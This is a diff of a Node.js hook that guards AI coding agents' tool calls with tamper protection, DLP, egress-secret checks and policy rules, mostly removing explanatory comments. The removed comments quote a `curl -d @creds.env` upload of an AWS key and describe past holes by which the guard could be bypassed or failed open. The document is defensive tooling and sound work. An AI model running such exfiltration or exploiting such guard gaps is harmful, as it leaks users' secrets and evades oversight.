         writeFileSync(tmp, entries.map((e) => String(e.ms).padStart(RL_STAMP, '0') + e.token + '\n').join(''));
         renameSync(tmp, file);
-      } catch { /* keep growing rather than risk the file */ }
+      } catch {  }
     }
     return null;
   } catch {
-    return null; // fail open
+    return null;
   }
 }
 
-// Runs all enabled enforcement layers; returns a deny reason or null (allow).
-// The patterns a mode wants SCANNED AND RECORDED while changing nothing, and
-// which of the two observing modes asked. Mirrors observingDLP in
-// packages/guard/main.go, including the order: redact outranks detect because
-// exactly one of the three shapes is ever written to disk, and a file carrying
-// both is a file that was edited by hand.
 function observingDLP(sec) {
   if (!sec) return null;
   if (sec.dlpRedact) return { cfg: sec.dlpRedact, mode: 'redact' };
@@ -2455,11 +1280,6 @@ function securityLayerCheck(toolName, args, cfg, agentKey) {
   try {
     if (cfg.dlpBlock) {
       const hit = dlpScan(args, cfg.dlpBlock);
-      // A DENIAL NAMES WHAT A PERSON CAN CHANGE. This said "check your dashboard for
-      // details", which on this build is an instruction to go and look at nothing,
-      // and the agent repeats it to whoever is reading, so the one message that has to
-      // be actionable sent them somewhere that does not exist. The file is the whole
-      // configuration, and it is the same file in every message here.
       if (hit) return 'Security layer (DLP): blocked - arguments contain a ' + hit +
         '. Blocked by SolonGate (DLP). Edit ~/.solongate/policy.json to change what is refused.';
     }
@@ -2470,45 +1290,22 @@ function securityLayerCheck(toolName, args, cfg, agentKey) {
           ' for this agent. Blocked by SolonGate (rate limit). Edit ~/.solongate/policy.json to review or adjust it.';
       }
     }
-  } catch { /* fail open */ }
+  } catch {  }
   return null;
 }
 
 
-// ── Translator (input side) ──
-// Normalize ANY client's raw hook payload into ONE canonical shape the whole
-// guard reasons over: Claude's flat {tool_name,tool_input,session_id,cwd} and
-// Antigravity's nested {toolCall:{name,args:{CommandLine,Cwd}},conversationId,
-// workspacePaths} come out identical here. EVERY tool call passes through this
-// before any check runs; the decision is emitted back per-client by blockTool/
-// allowTool/rewriteTool (the output side of the translator). New client = extend
-// only these two ends, the checks in between never see client-specific shapes.
-// Codex sends every file edit as ONE tool call: tool_name "apply_patch" with
-// tool_input { command: "*** Begin Patch\n*** Update File: src/a.ts\n…" }. The
-// target paths live INSIDE that patch text, so without this every path-scoped
-// rule (policy DENY, tamper, DLP) would see no path at all and a Codex
-// edit to a protected file would sail through. Lift them into the canonical
-// fields the rest of the guard already reads: file_path (first target) and an
-// edits[] array of {file_path} (what extractTargetPaths walks for the rest).
 function applyPatchTargets(patch) {
   const out = [];
   if (typeof patch !== 'string' || !patch.includes('*** ')) return out;
   const re = /^\*\*\*\s+(?:Add|Update|Delete)\s+File:\s*(.+?)\s*$/gm;
   let m;
   while ((m = re.exec(patch))) if (m[1]) out.push(m[1]);
-  // `*** Move to: <path>` renames the file named by the preceding Update File.
   const mv = /^\*\*\*\s+Move\s+to:\s*(.+?)\s*$/gm;
   while ((m = mv.exec(patch))) if (m[1]) out.push(m[1]);
   return out;
 }
 
-// Some clients hide their real targets inside free text instead of putting them
-// in an argument. Codex does this with apply_patch: one call, every touched path
-// living inside the patch body. Keyed on the patch TEXT rather than the tool
-// name, so this runs for any client that adopts the same format. Without it, no
-// path-scoped layer (policy, tamper, DLP) sees a path at all and an edit
-// to a protected file passes unexamined. The body is left intact so DLP can
-// still scan what is about to be written.
 function liftFreeformPatchPaths(call) {
   const cmd = call.command;
   if (call.tool !== 'apply_patch' && !(typeof cmd === 'string' && cmd.startsWith('*** Begin Patch'))) return;
@@ -2519,18 +1316,11 @@ function liftFreeformPatchPaths(call) {
   if (!Array.isArray(call.args.edits)) call.args.edits = targets.map((f) => ({ file_path: f }));
 }
 
-// Translator, input side. Hands the raw payload to the adapter for whichever
-// client is running, then applies the client-agnostic enrichment above. Returns
-// the neutral CALL every layer below reasons over. Nothing past this point knows
-// which client sent the call.
 function normalizeToolCall(raw) {
   const parsed = CLIENT.parse(raw) || {};
   const tool = parsed.tool || '';
   const call = {
     client: AGENT_TYPE,
-    // The client's own tool name, kept verbatim for logs and audit. Layers must
-    // NOT branch on it: clients name the same capability differently (Bash /
-    // run_command / shell). `permission` below is the neutral classification.
     tool,
     permission: guessPermission(tool),
     args: parsed.args || {},
@@ -2544,19 +1334,11 @@ function normalizeToolCall(raw) {
   return call;
 }
 
-// ── Main ──
 let input = '';
-// Read the contents of files a tool call references, so the AI Judge can see a
-// command HIDDEN inside a script/file (e.g. `bash deploy.sh`). Bounded: at most
-// a few small text files. Returns { name: content }.
 function readReferencedFiles(args, cwd) {
   const out = {};
   const MAX_FILES = 3, MAX_BYTES = 65536;
   const cands = new Set();
-  // Only inline a file that is actually EXECUTED by an interpreter, `bash x.sh`,
-  // `python x.py`, `source x`, `. x`. A file that is merely an argument (rm/cp/cat
-  // x, or a read/write target) is NOT run, so its content must NOT be scanned,
-  // otherwise deleting a file whose text mentions a blocked name would false-block.
   const INTERP = /^(?:bash|sh|zsh|ksh|dash|ash|python3?|node|deno|bun|ruby|perl|php|pwsh|powershell|source|\.)$/i;
   if (args && typeof args === 'object') {
     for (const f of ['command', 'cmd', 'script', 'shell', 'code']) {
@@ -2565,7 +1347,6 @@ function readReferencedFiles(args, cwd) {
       const toks = v.split(/[\s'"();|&<>]+/).filter(Boolean);
       for (let i = 0; i < toks.length - 1; i++) {
         if (!INTERP.test(toks[i])) continue;
-        // The first non-flag token after the interpreter is the script it runs.
         let j = i + 1;
         while (j < toks.length && toks[j].startsWith('-')) j++;
         if (j < toks.length) cands.add(toks[j]);
@@ -2587,54 +1368,14 @@ function readReferencedFiles(args, cwd) {
   return out;
 }
 
-// The payload was read at the top of this file, synchronously from fd 0, before
-// the Go guard was offered the call, see SG_STDIN. It is reused rather than
-// re-read for two reasons: fd 0 is already at EOF so a second read would return
-// nothing, and the fallback only means anything if Node still holds what the
-// binary was given.
-//
-// Reading fd 0 synchronously rather than through the process.stdin stream is
-// itself deliberate. On Windows + Node 24, calling process.exit() from inside the
-// stdin stream's 'end' callback aborts with `Assertion failed: !(handle->flags &
-// UV_HANDLE_CLOSING), file src\win\async.c`, libuv double-closes the stdin pipe
-// handle mid-teardown, the hook crashes before its exit code lands, and Claude
-// Code treats the DENY as a non-blocking hook failure (so the block never
-// applies). Reading fd 0 to EOF never creates that pipe handle, and the exit
-// below no longer runs inside a stream callback, so the loop tears down cleanly.
 input += SG_STDIN;
 ;(async () => {
- // Safety backstop ONLY: the normal path exits by natural drain (~1ms after work
- // finishes). If the loop somehow fails to drain, force-exit, 8s is well past every
- // fetch timeout (≤3s) so the threadpool is idle and exit() can't hit the abort.
  try { setTimeout(() => { try { process.exit(process.exitCode || 0); } catch {} }, 8000).unref(); } catch {}
  try {
-  // THERE IS NO CREDENTIAL GATE HERE, and its absence is the point.
-  //
-  // This used to read a key and allow the call when there was not one, the key
-  // being the whole test, on the reasoning that it selects the project and
-  // therefore the policy. That reasoning holds for a machine that has a service
-  // to ask. It makes the guard a NO-OP on every machine that does not, which is
-  // now every machine: there is no account and nothing to pair with. The policy
-  // is a file, and it was never read.
-  //
-  // Nothing needs to be allowed early for that case anyway. With no policy
-  // resolved, evaluate() returns null and the call falls through to allowTool()
-  // at the end, and with no key the refresh spawn and the audit POST are both
-  // skipped where they are written. What the early return also skipped was the
-  // tamper guard, so a machine with no credential could not protect its own
-  // state, and that state is exactly what a local policy is kept in.
-  // NOT `Date.now()`. Every `Date.now(), _evalStart` below becomes an
-  // evaluation_time_ms in the audit log, the number the dashboard, the TUI
-  // and the TUI print as what this call paid to be guarded. Measured from here
-  // it excluded Node's boot and this file's parse, which is most of the cost,
-  // and reported ~1ms for a hook that was really taking tens. See SG_ORIGIN_MS.
   const _evalStart = SG_ORIGIN_MS;
   try {
     const raw = JSON.parse(input);
 
-    // Debug: append guard invocation to a cwd-local log. Opt-in only, set
-    // SOLONGATE_DEBUG=1 to enable. Off by default so it doesn't litter every
-    // working directory with .solongate/.debug-guard-log.
     if (process.env.SOLONGATE_DEBUG) {
       try {
         const { appendFileSync: afs, mkdirSync: mds } = await import('node:fs');
@@ -2644,23 +1385,13 @@ input += SG_STDIN;
       } catch {}
     }
 
-    // Capture the call's identity from the RAW payload (pre-normalization, so
-    // the value matches what the PostToolUse audit hook will see) for the deny
-    // flag. tool_use_id is the exact call on clients that send it (Codex always
-    // does); the fingerprint covers the rest.
     CALL_ID = String(raw.tool_use_id || raw.toolUseId || raw.tool_call_id || '');
     try { CALL_FP = callFingerprint(JSON.stringify(raw.tool_input || raw.toolInput || raw.params || {})); } catch { CALL_FP = ''; }
 
-    // Translator: every client's payload (Claude flat, Antigravity toolCall, …)
-    // → one canonical shape. All checks below reason over `data` only.
     const call = normalizeToolCall(raw);
     const args = call.args;
     const toolName = call.tool;
 
-    // Diagnostic: print the neutral CALL the translator produced. Feed the same
-    // logical call from different clients with SOLONGATE_DEBUG=1 and this line
-    // comes out identical for all of them, that identity IS the standardization.
-    // Off unless explicitly enabled, so it never adds noise to a normal run.
     if (process.env.SOLONGATE_DEBUG) {
       try {
         process.stderr.write('[SolonGate CALL] ' + JSON.stringify({
@@ -2670,85 +1401,25 @@ input += SG_STDIN;
       } catch {}
     }
 
-    // THE FAST TAMPER PATH IS GONE, and removing it fixes an enforcement hole.
-    //
-    // It existed for a real reason: the slow path below used to mean a cache read, an
-    // OPA WASM instantiation and a detached background refresh, and doing all that
-    // before deciding a tamper block made the earliest guard processes in a
-    // concurrent denial burst exceed Claude Code's PreToolUse timeout and get
-    // SIGKILLed partway through writing their log. So tamper, which never depended
-    // on the policy, was decided first, from a cheap read of the policy CACHE.
-    //
-    // Two things changed. The slow path is no longer slow: no WASM, no refresh, one
-    // file read and a deterministic evaluator. And NOTHING WRITES THE CACHE, so the
-    // cheap read always missed, which mattered far more than the speed, because the
-    // egress check was gated on it:
-    //
-    //     const _er = (!_tr && _cacheOk) ? egressSecretCheck(args, _sec, call.cwd) : null;
-    //
-    // _cacheOk was false on every call, so egressSecretCheck NEVER RAN. A `curl -d
-    // @creds.env https://…` that uploads a file holding an AWS key was allowed, with
-    // dlpBlock configured and working for every other surface. The Go twin ran the
-    // same check off the policy file and blocked it, the two disagreed about a
-    // secret leaving the machine, which is the worst place for them to disagree.
-    //
-    // Egress now runs below, from the file, in the Go guard's order: tamper, then
-    // egress, then the layers, then the policy.
 
-    // (self-protection + PI hook layers removed per project decision)
 
-    // Load policy. In order:
-    //   1. a service, when one is configured (GET /api/v1/policies/active, ~10s)
-    //   2. ~/.solongate/policy.json, this machine's own file
-    //   3. policy.json beside cwd, rules only
-    //
-    // A configured service outranks the file, because on a machine that has one
-    // the file is how somebody would work around it. The file is NOT a fallback
-    // for a failed fetch, though, it used to be reachable only that way, which
-    // made a machine with no service enforce nothing at all.
     const hookCwd = call.cwd || process.cwd();
     let policy;
-    // Self-protection (tamper guard) defaults ON. The cloud per-project setting
-    // can turn it off; delivered via /policies/active and cached alongside the
-    // policy. Any failure to read it leaves protection ON (fail safe).
     let selfProtectEnabled = true;
-    // Extra security layers (rate limit, egress, DLP block) delivered by the
-    // cloud. Null = none configured. Fail open if unread.
     let securityCfg = null;
-    // agentKey names this agent's own rate-limit counter. It used to name a POLICY
-    // CACHE too, a service's answer kept close at hand with a 10s TTL, a
-    // last-known-good fallback, a detached refresh and a debounce lock in front of
-    // it. Nothing writes that cache now, so every read of it missed and every
-    // branch below it stood in front of the one source there is.
     const agentKey = (AGENT_ID || 'default').replace(/[^a-zA-Z0-9_-]/g, '_');
     try {
       {
         const local = loadLocalPolicyFile(hookCwd);
         if (local) {
           policy = local.policy;
-          // The layers and the tamper flag travel with the policy, and this file is
-          // the only thing that carries them now. `undefined` means the file said
-          // nothing, which is not the same as saying off.
           if (local.security !== undefined) securityCfg = local.security;
           if (local.selfProtect !== undefined) selfProtectEnabled = local.selfProtect;
         }
       }
     } catch {
-      // Couldn't load any policy, leave policy undefined; evaluate() returns null.
     }
 
-    // AGENT SCOPING NARROWS THE POLICY, NOT THE GUARD, and it used to do the
-    // second. `policy.agents` naming other clients returned ALLOW right here,
-    // above tamper protection, egress, DLP and the rate limit, so a policy
-    // written for Codex switched self-protection off for Claude Code. None of
-    // those layers is part of the policy: three of them are configured in a
-    // different block of the same file and the fourth cannot be configured at
-    // all. The Go twin has no scoping, so it never had the hole, and matching the
-    // two by copying the early return into Go would have been importing a bypass
-    // rather than closing one.
-    //
-    // So the scope decides whether the RULES apply, and is read again at the
-    // policy step below. Everything above it runs either way.
     const policyInScope = (() => {
       const scope = (policy && Array.isArray(policy.agents) && policy.agents.length > 0)
         ? policy.agents
@@ -2756,37 +1427,15 @@ input += SG_STDIN;
       return scope.includes('*') || scope.includes(AGENT_TYPE);
     })();
 
-    // Tamper / self-protection, runs before policy eval. ON by default; the file
-    // can turn it off (fail safe: stays on if the file is silent or unreadable).
     let reason = selfProtectEnabled ? tamperCheck(toolName, args) : null;
-    // THE USER'S OWN PROTECTED PATHS AND require-sandbox, in the Go guard's
-    // order and OUTSIDE the selfProtect condition above. See userProtectedCheck:
-    // a person may switch the guard's self-protection off, and that must not also
-    // cancel a promise they made about their own files.
     if (!reason) reason = sandboxRequired(securityCfg);
     if (!reason) reason = userProtectedCheck(toolName, args, securityCfg);
-    // A secret leaving the machine in the ARGUMENTS of a call, as opposed to one
-    // read out of a file, which is the redaction plan's job. Second, exactly as in
-    // guard/main.go: it is the check with the narrowest trigger (a transfer
-    // command with an outward target) and the heaviest consequence.
     if (!reason) reason = egressSecretCheck(args, securityCfg, call.cwd);
-    // Extra security layers run after tamper and egress, before policy. A block
-    // reason wins immediately (BLACK). Fail-open by design.
     if (!reason) reason = securityLayerCheck(toolName, args, securityCfg, agentKey);
-    // ROUTING IS BINARY: WHITE (allow) / BLACK (block). Nothing is escalated to a
-    // model and there is no judge, so a REVIEW rule reads as allow under denylist.
-    //
-    // The decision is hooks/policy-eval.mjs, shared with the MCP proxy. It used to
-    // be OPA WASM with this as the cold-start fallback, "run the deterministic,
-    // WASM-free JS evaluator so DENY rules and whitelist defaults apply
-    // IMMEDIATELY, from the very first call", and the bundle came from a service.
-    // With no service there is no bundle, on every call rather than only the first.
     let opaRoute = 'white';
     if (reason) {
-      opaRoute = 'black'; // hardcoded tamper protection blocked it
+      opaRoute = 'black';
     } else if (policy && policy.rules && policyInScope) {
-      // hookCwd is the directory the call was made from, and a relative path
-      // token in a shell command only means a file once it is resolved against it.
       const verdict = evaluate(policy, args, toolName, hookCwd);
       if (typeof verdict === 'string') {
         reason = verdict;
@@ -2796,71 +1445,24 @@ input += SG_STDIN;
       }
     }
 
-    // Antigravity / Codex read redaction, runs LAST, only when the call is
-    // otherwise ALLOWED (no tamper/security/policy DENY). Claude redacts a
-    // secret in a read's OUTPUT via its PostToolUse audit; neither agy nor Codex
-    // can rewrite tool OUTPUT (agy has no PostToolUse at all; Codex has one but
-    // explicitly rejects an output rewrite from it), so for both we redact the
-    // file into a temp copy and point the read at it BEFORE it runs, via
-    // `overwrite` on agy, `updatedInput` on Codex.
-    // It MUST come after policy eval: a file a DENY rule blocks (a `.env` filename
-    // or `secrets/` path) must never be served, not even redacted. Putting this
-    // before OPA (as it once was) let a redaction rewrite terminate the hook and
-    // silently bypass the policy block. Fail-closed: a secret we can't redact
-    // becomes a block.
-    // DETECT IS DELIBERATELY ABSENT from this condition. Masking a file's
-    // contents on the way to the model is redacting; a mode called detect that
-    // did it was doing a stronger mode's work under a weaker mode's name, and
-    // whoever chose detect never saw the value they had asked only to be told
-    // about. dlpObserve is scanned and recorded, never rewritten.
-    //
-    // THE CAPABILITY GATE IS FOR REDACT, NOT FOR BLOCK. Masking can be deferred
-    // to a client that rewrites its own tool output, which is why this scan was
-    // skipped there. Refusing cannot: by the time a post-tool stage runs, the
-    // file has been read. So block mode ran this on nobody who could redact, and
-    // `cat secrets.pem` came back masked and ALLOWED on exactly the clients most
-    // people use. Block quietly degraded to redact, the same shape of bug detect
-    // had.
     const dlpBlocking = !!(securityCfg && securityCfg.dlpBlock);
     if (!reason && securityCfg && (securityCfg.dlpBlock || securityCfg.dlpRedact)
         && (dlpBlocking || !CLIENT.redactsOutput)) {
       const dlpCfg = securityCfg.dlpBlock || securityCfg.dlpRedact;
       const plan = dlpRedactReadPlan(toolName, args, dlpCfg, hookCwd);
-      // A rewrite plan means the file HAS a secret and redaction is possible. In
-      // block mode that is not an offer to take.
       if (plan && (plan.block || (dlpBlocking && plan.rewrite))) {
         reason = 'Security layer (DLP): reading a file that contains a secret is blocked. Blocked by SolonGate.';
         opaRoute = 'black';
       } else if (plan && plan.rewrite) {
-        rewriteTool(plan.rewrite); // verdict first, update later
+        rewriteTool(plan.rewrite);
       }
     }
 
-    // Diagnostic line for the terminal. NOT written on Codex: there the hook's
-    // ENTIRE stderr becomes the block reason shown to the model (exit 2), so this
-    // would prefix every denial with "[SolonGate ROUTE] BLACK (block)".
     if (AGENT_TYPE !== 'codex') process.stderr.write(`[SolonGate ROUTE] ${opaRoute.toUpperCase()} (${reason ? 'block' : 'allow'})\n`);
 
-    // Hand the measured policy-eval time to the audit hook: PostToolUse logs the
-    // ALLOW path and can't time the guard itself, so it reads this file back.
-    // Keyed by tool + session so the audit hook can match THIS invocation even
-    // when the tool itself runs for minutes (a bare timestamp TTL lost those).
     try {
       const _fd = projectFlagDir(); mkdirSync(_fd, { recursive: true });
-      sweepLegacyFlagDir(); // every call, not just denials
-      // THE SAME FIELDS THE GO GUARD WRITES, and they were not.
-      //
-      // This wrote four of them: ms, ts, tool, session. The Go guard writes
-      // eleven. Nothing noticed for as long as the only reader was the audit
-      // hook, which wants the timing and nothing else, and then the first-run
-      // screen started reading the ring to show somebody their first judged
-      // call, and on a machine running the Node guard it had a tool name and
-      // four dashes. The record looked fabricated because it was nearly empty.
-      //
-      // Which of the two guards wrote a line is not something a reader should
-      // be able to tell. Argument KEY NAMES and counts only, as over there: the
-      // values are the file contents, commands and URLs this whole thing exists
-      // to keep where they belong.
+      sweepLegacyFlagDir();
       const _isExec = guessPermission(toolName) === 'EXECUTE';
       const _rec = {
         ms: Date.now() - _evalStart,
@@ -2877,11 +1479,6 @@ input += SG_STDIN;
         sandbox: process.env.SOLONGATE_SANDBOX || '',
       };
       writeFileSync(join(_fd, '.last-eval'), JSON.stringify(_rec));
-      // Also append to a short ring. When many tool calls run in PARALLEL they all
-      // race on the single .last-eval above (overwrite / torn read → blank eval
-      // time in the log). appendFileSync lines are atomic, so the PostToolUse
-      // audit hook can recover a value by averaging the recent same-session
-      // records, a parallel burst then shares one arithmetic-mean eval time.
       try {
         const ring = join(_fd, '.eval-ring.jsonl');
         appendFileSync(ring, JSON.stringify(_rec) + '\n');
@@ -2889,19 +1486,6 @@ input += SG_STDIN;
       } catch {}
     } catch {}
 
-    // DETECT MODE, AND ONLY WHERE NOTHING ELSE WILL COUNT IT. On a client with a
-    // post-tool stage the audit hook scans the arguments and files the ALLOW row,
-    // and doing it here as well would double-count. On a client without one,
-    // Antigravity has no PostToolUse at all, nothing else ever runs, so a
-    // secret that went out in an argument had no record anywhere that it did, and
-    // a mode whose whole job is to observe observed nothing. The Go guard has
-    // counted it here for a while (see recordObserved in guard/main.go); this is
-    // the half that was missing.
-    //
-    // Only when nothing has blocked: a call already refused is a DENY row below,
-    // not an observation. And only when block mode is NOT configured, the API
-    // writes exactly one of the three DLP shapes, so the two cannot both fire for
-    // one call, and the ordering makes that impossible to get wrong later.
     if (!reason && !CLIENT.reportsAfter && securityCfg && !securityCfg.dlpBlock) {
       try {
         const _obs = observingDLP(securityCfg);
@@ -2922,11 +1506,9 @@ input += SG_STDIN;
             });
           }
         }
-      } catch { /* an observation is never a reason to disturb a call */ }
+      } catch {  }
     }
 
-    // Only log DENY decisions from guard hook.
-    // ALLOW decisions are logged by the audit hook (PostToolUse) to avoid double-counting.
     if (reason) {
       if (true) {
         try {
@@ -2943,20 +1525,11 @@ input += SG_STDIN;
         } catch {}
       }
       writeDenyFlag(toolName);
-      // The verdict used to be emitted before a hook self-update, and the reason
-      // is worth keeping even though the update is gone: that update fetched three
-      // hooks at up to 5s each, and this process carries an 8s backstop that
-      // force-exits with `process.exitCode || 0`, i.e. ALLOW. A slow network on
-      // it turned a decided DENY into a permitted call. Measured at 8043ms, exit
-      // 0, on a call DLP had already refused. Nothing slow may run before a
-      // verdict is out.
       blockTool(reason);
     }
   } catch {}
   allowTool();
  } catch (e) {
-  // SG_DONE is the normal terminator (exitCode already set); anything else is an
-  // unexpected error, fail OPEN (exit 0) so a hook bug never wedges the agent.
   if (e !== SG_DONE) { process.exitCode = process.exitCode || 0; }
  }
 })();
